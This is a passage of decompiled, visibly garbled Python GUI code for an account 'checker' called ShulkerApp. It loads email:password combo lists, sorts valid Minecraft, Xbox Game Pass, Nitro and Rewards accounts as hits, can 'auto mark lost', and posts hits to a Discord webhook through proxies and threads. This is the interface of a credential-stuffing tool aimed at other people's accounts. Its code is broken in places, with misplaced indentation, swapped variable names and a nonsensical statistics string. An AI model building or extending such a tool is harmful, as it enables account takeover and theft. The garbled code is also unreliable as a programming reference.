            for field_data in self.embed_field_widgets:
                name = field_data['name_entry'].get().strip()
                value = field_data['value_entry'].get('1.0', 'end-1c').strip()
                inline = field_data['inline_var'].get()
                if name and value:
                    pass  # postinserted
                else:  # inserted
                    custom_fields.append({'name': name, 'value': value, 'inline': inline})
            else:  # inserted
                self.config.set('discord.embed_fields', custom_fields)
                for key, var in self.timeout_vars.items():
                    self.config.set(key, var.get())
                self.config.set('rate_limiting.enabled', self.rate_limiting_enabled_var.get())
                self.config.set('rate_limiting.global_delay', self.global_delay_var.get())
                self.config.set('logging.level', self.log_level_var.get())
                self.settings['thread_count'] = self.max_threads_var.get()
                self.settings['proxy_enabled'] = self.proxy_enabled_var.get()
                self.settings['discord_enabled'] = self.discord_enabled_var.get()
                self.settings['hypixel_enabled'] = self.hypixel_var.get()
                self.settings['donut_enabled'] = self.donut_var.get()
                self.settings['ms_rewards_enabled'] = self.rewards_var.get()
                self.settings['auto_mark_lost'] = self.mark_lost_var.get()
                self.config.save()
                if self.checking:
                    messagebox.showwarning('Settings Saved', 'Configuration saved successfully!\n\nNote: Some settings will only take effect after stopping and restarting the checker.')
                logger.info('All configuration settings saved')
        except Exception as e:
            logger.error(f'Error saving configuration: {e}', exc_info=True)
            messagebox.showerror('Error', f'Failed to save configuration: {e}')

    def toggle_discord_editor(self):
        """Show/hide embed editor based on Discord webhook checkbox"""  # inserted
        discord_enabled = self.discord_enabled_var.get()
        if hasattr(self, 'discord_check'):
            if discord_enabled:
                self.discord_check.select()
            self.settings['discord_enabled'] = discord_enabled
        if discord_enabled:
            self.embed_editor_frame.pack(fill='x', pady=10, padx=20)
        return None

    def add_embed_field(self, name='', value='', inline=False):
        """Add a new embed field editor (collapsible)"""  # inserted
        content_frame = len(self.embed_field_widgets)
        field_container = ctk.CTkFrame(self.fields_scroll_frame, fg_color='transparent')
        field_container.pack(fill='x', pady=5, padx=5)
        header_frame = ctk.CTkFrame(field_container, fg_color='transparent')
        header_frame.pack(fill='x', padx=5, pady=5)
        collapse_btn = ctk.BooleanVar(value=True)

        def toggle_field():
            if collapse_var.get():
                content_frame.pack(fill='x', padx=5, pady=5)
                collapse_btn.configure(text='▼')
            return None
        self = ctk.CTkButton(header_frame, text='▼', width=30, height=25, command=lambda: [collapse_var.set(not collapse_var.get()), toggle_field()])
        self.pack(side='left', padx=5)
        field_title = name if name else f'Field {content_frame + 1}'
        name_entry = ctk.CTkLabel(header_frame, text=field_title if field_title else f'Field {content_frame + 1}', font=ctk.CTkFont(size=12, weight='bold'), anchor='w')
        name_entry.pack(side='left', padx=5, fill='x', expand=True)
        delete_btn = ctk.CTkButton(header_frame, text='🗑️', width=40, height=25, fg_color='transparent', hover_color=('gray70', 'gray30'), command=lambda: self.remove_embed_field(field_id))
        delete_btn.pack(side='right', padx=5)
        collapse_var = ctk.CTkFrame(field_container, fg_color='transparent')
        collapse_var.pack(fill='x', padx=5, pady=5) if collapse_btn.get() else collapse_var.pack(fill='x', padx=5, pady=5)
        name_frame = ctk.CTkFrame(collapse_var, fg_color='transparent')
        name_frame.pack(fill='x', pady=3, padx=5)
        ctk.CTkLabel(name_frame, text='Name:', width=80, anchor='w').pack(side='left', padx=5)
        field_id = ctk.CTkEntry(name_frame, placeholder_text='🎮 Minecraft')
        field_id.pack(side='left', padx=5, fill='x', expand=True)
        if name:
            field_id.insert(0, name)

        def update_title(*args):
            new_name = name_entry.get().strip()
            if new_name:
                title_label.configure(text=new_name)
            return None
        field_id.bind('<KeyRelease>', update_title)
        value_frame = ctk.CTkFrame(collapse_var, fg_color='transparent')
        value_frame.pack(fill='x', pady=3, padx=5)
        ctk.CTkLabel(value_frame, text='Value:', width=80, anchor='w').pack(side='left', padx=5, anchor='n', pady=(5, 0))
        value_entry = ctk.CTkTextbox(value_frame, height=60, font=ctk.CTkFont(size=10))
        value_entry.pack(side='left', padx=5, fill='x', expand=True)
        if value:
            value_entry.insert('1.0', value)
        inline_frame = ctk.CTkFrame(collapse_var, fg_color='transparent')
        inline_frame.pack(fill='x', pady=3, padx=5)
        inline_var = ctk.BooleanVar(value=inline)
        inline_checkbox = ctk.CTkCheckBox(inline_frame, text='Inline', variable=inline_var)
        inline_checkbox.pack(side='left', padx=5)
        field_data = {'container': field_container, 'header': header_frame, 'content': collapse_var, 'collapse_btn': self, 'collapse_var': collapse_btn, 'title_label': name_entry, 'name_entry': field_id, 'value_entry': value_entry, 'inline_var': inline_var, 'id': content_frame}
        self.embed_field_widgets.append(field_data)
        return field_data

    def remove_embed_field(self, field_id):
        """Remove an embed field"""  # inserted
        if 0 <= field_id < len(self.embed_field_widgets):
            field_data = self.embed_field_widgets[field_id]
            field_data['container'].destroy()
            self.embed_field_widgets.pop(field_id)
            for idx, field in enumerate(self.embed_field_widgets):
                field['id'] = idx
                for widget in field['header'].winfo_children():
                    if isinstance(widget, ctk.CTkButton) and widget.cget('text') == '🗑️':
                        pass  # postinserted
                    else:  # inserted
                        widget.configure(command=lambda f=idx: self.remove_embed_field(f))
        return None

    def save_discord_config(self):
        """Save Discord configuration including embed settings"""  # inserted
        try:
            self.config.set('discord.enabled', self.discord_enabled_var.get())
            self.config.set('discord.webhook_url', self.webhook_url_entry.get().strip())
            self.config.set('discord.username', self.webhook_name_entry.get().strip())
            self.config.set('discord.avatar_url', self.webhook_icon_entry.get().strip())
            self.config.set('discord.send_all_hits', False)
            self.config.set('discord.send_minecraft', self.send_minecraft_var.get())
            self.config.set('discord.send_nitro', self.send_nitro_var.get())
            self.config.set('discord.send_2fa', self.send_2fa_var.get())
            self.config.set('discord.send_gamepass', self.send_gamepass_var.get())
            self.config.set('discord.send_rewards', self.send_rewards_var.get())
            self.config.set('discord.rewards_threshold', self.rewards_threshold_var.get())
            self.config.set('discord.use_custom_embed', self.use_custom_embed_var.get())
            self.config.set('discord.embed_title', self.embed_title_entry.get())
            self.config.set('discord.embed_description', self.embed_desc_entry.get('1.0', 'end-1c'))
            color_value = self.embed_color_entry.get().strip()
            if color_value:
                if color_value.startswith('0x'):
                    self.config.set('discord.embed_color', color_value)
            self.config.set('discord.embed_footer', self.embed_footer_entry.get())
            self.config.set('discord.embed_footer_icon', self.embed_footer_icon_entry.get().strip())
            custom_fields = []
            for field_data in self.embed_field_widgets:
                name = field_data['name_entry'].get().strip()
                value = field_data['value_entry'].get('1.0', 'end-1c').strip()
                inline = field_data['inline_var'].get()
                if name and value:
                    pass  # postinserted
                else:  # inserted
                    custom_fields.append({'name': name, 'value': value, 'inline': inline})
            else:  # inserted
                self.config.set('discord.embed_fields', custom_fields)
                self.config.save()
                messagebox.showinfo('Success', 'Discord configuration saved!')
                logger.info('✅ Discord configuration saved')
        except Exception as e:
            messagebox.showerror('Error', f'Failed to save Discord config: {e}')
            logger.error(f'Failed to save Discord config: {e}')

    def update_checkers(self):
        """Update checker settings (legacy method - redirects to save_all_config)"""  # inserted
        self.save_all_config()

    def _validate_discord_webhook(self):
        """Validate Discord webhook before starting checking"""  # inserted
        discord_enabled_quick = hasattr(self, 'discord_check') and self.discord_check.get()
        discord_enabled_settings = self.discord_enabled_var.get()
        discord_enabled_quick or None
        discord_enabled = discord_enabled_settings
        if not discord_enabled:
            pass  # postinserted
        return True

    def start_checking(self):
        """Start checking accounts"""  # inserted
        if not self.combo_file:
            messagebox.showerror('Error', 'Please select a combo file')
        return None

    def checking_loop(self, accounts):
        """Main checking loop with smart threading"""  # inserted
        from queue import Queue
        import threading as mt
        self.total_accounts = len(accounts)
        self.account_queue = Queue()
            self.account_queue.put(account)
        self.results_lock = mt.Lock()

        def worker_thread():
            """Worker thread that checks accounts"""  # inserted
            if self.checking:
                if not self.pause_event.is_set():
                    self.pause_event.wait(timeout=0.1)
                    continue
                return None
        self.worker_threads = []
        for i in range(self.settings['thread_count']):
            t = mt.Thread(target=worker_thread, daemon=True, name=f'Worker-{i + 1}')
            t.start()
            self.worker_threads.append(t)
        for t in self.worker_threads:
            t.join()
        logger.info('✅ All accounts checked!')
        self.after(0, self.checking_finished)

    def pause_checking(self):
        """Pause/resume checking"""  # inserted
        self.paused = not self.paused
        if self.paused:
            self.pause_event.clear()
            self.pause_btn.configure(text='▶️ RESUME')
            self.status_label.configure(text='Status: Paused')
            logger.info('Checking paused')
        return None

    def stop_checking(self):
        """Stop checking"""  # inserted
        self.checking = False
        self.paused = False
        self.pause_event.set()
        logger.info('Stopping checker...')
        self.status_label.configure(text='Status: Stopping...')
        import time
        for t in self.worker_threads:
            t.join(timeout=2)

    def checking_finished(self):
        """Called when checking is complete"""  # inserted
        self.checking = False
        self.paused = False
        self.pause_event.set()
        self.start_btn.configure(state='normal')
        self.pause_btn.configure(state='disabled', text='⏸️ PAUSE')
        self.stop_btn.configure(state='disabled')
        self.status_label.configure(text='Status: Complete')
        messagebox.showinfo('Complete', f"Checked {self.stats['checked']} accounts!\n\nHits: {self.stats['hits']}\nBad: {self.stats['bad']}\nErrors: {self.stats['errors']}")

    def update_stats_loop(self):
        """Update all stats displays with smooth animations - optimized"""  # inserted
        try:
            if self._resize_in_progress:
                self.after(100, self.update_stats_loop)
            return None
            self.after(1000, self.update_stats_loop)
        except Exception as e:
            logger.error(f'Error in update_stats_loop: {e}')

    def update_mini_stats(self):
        """Update mini stats display in right panel"""  # inserted
        return f"\n{'=================================================='}\n📊 DETAILED STATISTICS\n{'=================================================='}\n\n📈 PROGRESS:\n   Checked: {self.stats['checked']} / {self.stats.get('total', 0)}{'=================================================='}\n   Bad: {self.stats['bad']}\n   Errors: {self.stats['errors']}\n\n🎮 MINECRAFT:\n   Normal (Minecraft Only): {self.stats['normal_minecraft']}\n\n🎮 XBOX:\n   Game Pass PC: {self.stats['gamepass_pc']}\n   Game Pass Ultimate: {self.stats['gamepass_ultimate']}\n   Errors: {self.stats['\n   Xbox Codes: ']}xbox_codes{self.stats['\n\n💜 NITRO:\n   Claimed: ']}nitro_claimed{self.stats['\n   Unclaimed: ']}nitro_unclaimed{self.stats['\n\n🔄 AUTO MARK LOST:\n   Success: ']}mark_lost_success{self.stats['\n\n🔒 SECURITY:\n   2FA: ']}2fa{self.settings['thread_count']}\n\n⏱️ TIME:\n   Elapsed: {self.start_time - 0}\n\n⏱️ TIME:\n   Elapsed: {self.start_time - 0}\n\n⏱️ TIME:\n   Elapsed: {self.start_time - 0}\n\n⏱️ TIME:\n   Elapsed: {self.start_time - 0}\n\n⏱️ TIME:\n   Elapsed: {self.start_time - 0}\n\n⏱️ TIME:\n   Elapsed: {self.start_time - 0}\n\n⏱️ TIME:\n   Elapsed: {self.start_time - 0}\n\n⏱️ TIME:\n   Elapsed: {self.start_time - 0}\n\n⏱️ TIME:\n   Elapsed: {self.start_time - 0}\n\n⏱️ TIME:\n   Elapsed: {self.start_time - 0}
        self.mini_stats_text.delete('1.0', 'end')
        self.mini_stats_text.insert('1.0', stats_text.strip())

    def update_logs(self):
        """Update log display - process queued log entries"""  # inserted
        self.log_handler.process_queue() if hasattr(self, 'log_handler') else None
        self.after(100, self.update_logs)

    def format_account_log(self, email, password, result):
        """\nFormat account result into log entry\nFormat: [Valid_mail/2fa/Mc/Invalid] email:pass | Username | capes | hypixel ban/unban | donut ban/unban\n"""  # inserted
        return f'[Invalid] {email}:{password}', 'bad' if not result else (f'[Invalid] {email}:{password}', 'bad')

    def clear_logs(self):
        """Clear log display"""  # inserted
        self.log_text.delete('1.0', 'end')
        logger.info('Logs cleared')

    def save_logs(self):
        """Save logs to file"""  # inserted
        try:
            filename = filedialog.asksaveasfilename(title='Save Logs', defaultextension='.txt', filetypes=[('Text Files', '*.txt'), ('All Files', '*.*')])
            if filename:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(self.log_text.get('1.0', 'end'))
                        messagebox.showinfo('Success', 'Logs saved!')
            return None
        except Exception as e:
            messagebox.showerror('Error', f'Failed to save logs: {e}')
            logger.error(f'Error saving logs: {e}')

    def get_session_folders(self):
        """Get list of session folders"""  # inserted
        results_dir = 'results'
        if not os.path.exists(results_dir):
            return []

    def refresh_sessions(self):
        """Refresh session dropdown"""  # inserted
        sessions = self.get_session_folders()
        self.session_dropdown.configure(values=sessions)
        if sessions:
            current_session = self.session_var.get()
            if current_session in sessions:
                self.load_session_files(current_session)
            return None
        return None

    def load_session_files(self, session_name=None):
        """Load files for selected session"""  # inserted
        session_name = self.session_var.get() if session_name is None else session_name
        if not session_name:
            pass  # postinserted
        return None

    def load_file_content(self, filepath, filename):
        """Load and display file content"""  # inserted
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                    self.file_content_text.delete('1.0', 'end')
                    self.file_content_text.insert('1.0', content)
                    logger.debug(f'Loaded file: {filename}')
        except Exception as e:
            self.file_content_text.delete('1.0', 'end')
            self.file_content_text.insert('1.0', f'Error loading file: {e}')
            logger.error(f'Error loading file {filename}: {e}')

    def on_closing(self):
        """Handle window closing"""  # inserted
        logger.info('Application closing...')
        self.checking = False
        if self.checker_engine:
            try:
                self.checker_engine.session_manager.close_all()
        self.destroy()
        except:
            pass  # postinserted
        pass
if __name__ == '__main__':
    app = ShulkerApp()
    app.protocol('WM_DELETE_WINDOW', app.on_closing)
    app.mainloop()

